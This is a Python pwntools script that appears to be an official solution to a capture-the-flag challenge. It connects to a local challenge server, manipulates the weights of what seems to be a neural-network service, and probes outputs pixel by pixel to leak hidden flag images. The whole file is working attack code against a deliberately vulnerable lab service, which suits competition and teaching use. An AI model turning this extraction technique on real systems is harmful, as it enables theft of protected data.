# Copyright 2022 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from pwn import *
from PIL import Image

#r = process(["python3", "server.py"])
r = remote("localhost", 44763)

r.recvuntil("Menu")
r.sendline("0")

r.recvuntil("Menu")

def set_weight(args, value):
    r.sendline("1")
    r.sendline(" ".join(str(c) for c in args + [value]))
    #r.recvuntil("Menu")

def evaluate():
    r.sendline("2")
    r.recvuntil("sees: ")
    s = r.recvline().decode()
    #r.recvuntil("Menu")
    return s.split("'")[1]

W, H = 16, 16
RGB = 3

# Flag length
LEN = 34

# Color resolution. Higher resolution takes more time, 3 is enough.
# 2 leaks every letter but one.
RESOLUTION = 3

pixels = [[0] * (W*H*RGB) for i in range(LEN)]

set_weight([2, 0, ord('_')], 100)
set_weight([2, 1, ord('^')], 100)

for thresh in range(1, RESOLUTION):
    threshold = thresh / RESOLUTION
    set_weight([1, 1], threshold)
    for pixel in range(W*H*RGB):
        set_weight([0, pixel, 0], 1.0)
        s = evaluate()
        set_weight([0, pixel, 0], 0.0)
        print(pixel, threshold, s)
        for i, c in enumerate(s):
            if c == '_': # Still low.
                pixels[i][pixel] = threshold

for i, picture in enumerate(pixels):
    im = Image.new("RGB", (W, H))
    data = []
    for j in range(0, W*H*RGB, 3):
        data.append(tuple([int(x*255) for x in picture[j:j+3]]))
    im.putdata(data)
    im.save("leaked/%02d.png" % i)
    print(picture[:3])
